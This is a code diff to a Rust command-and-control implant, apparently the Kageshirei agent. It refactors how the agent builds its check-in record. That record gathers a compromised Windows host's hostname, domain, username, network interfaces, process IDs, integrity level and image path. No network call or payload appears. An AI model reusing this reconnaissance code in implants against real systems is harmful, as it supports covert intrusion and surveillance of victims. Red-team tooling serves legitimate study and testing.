@@ -1,10 +1,6 @@
 use core::ffi::c_void;
 
-use kageshirei_communication_protocol::{
-    communication::checkin::{Checkin, PartialCheckin},
-    metadata::Metadata,
-    network_interface::NetworkInterface,
-};
+use kageshirei_communication_protocol::{communication::Checkin, NetworkInterface};
 use libc_print::libc_println;
 use mod_agentcore::instance_mut;
 use mod_win32::{
@@ -13,8 +9,6 @@ use mod_win32::{
     nt_peb::{get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain, get_username},
     nt_ps_api::{get_pid_and_ppid, get_process_integrity},
 };
-
-use crate::common::utils::generate_request_id;
 
 /// Gathers and initializes metadata such as computer name, OS info, IP addresses, etc.
 pub fn initialize_system_data() {
@@ -70,28 +64,19 @@ pub fn initialize_system_data() {
         // Create a list of NetworkInterface object from the gathered IP addresses
 
         // Create a Checkin object with the gathered metadata
-        let mut checkin = Box::new(Checkin::new(PartialCheckin {
+        let checkin = Box::new(Checkin {
             operative_system: operating_system,
             hostname,
             domain: get_user_domain(),
             username: get_username(),
             network_interfaces,
-            process_id: pid as i64,
-            parent_process_id: ppid as i64,
+            pid: pid as i64,
+            ppid: ppid as i64,
             process_name: get_process_name(),
             integrity_level: rid,
             cwd: get_image_path_name(),
-        }));
-
-        // Add metadata to the Checkin object
-        let metadata = Metadata {
-            request_id: generate_request_id(32),
-            command_id: generate_request_id(32),
-            agent_id:   generate_request_id(32),
-            path:       None,
-        };
-
-        checkin.with_metadata(metadata);
+            metadata: None,
+        });
 
         // Set the Checkin data in the global instance
         instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void);
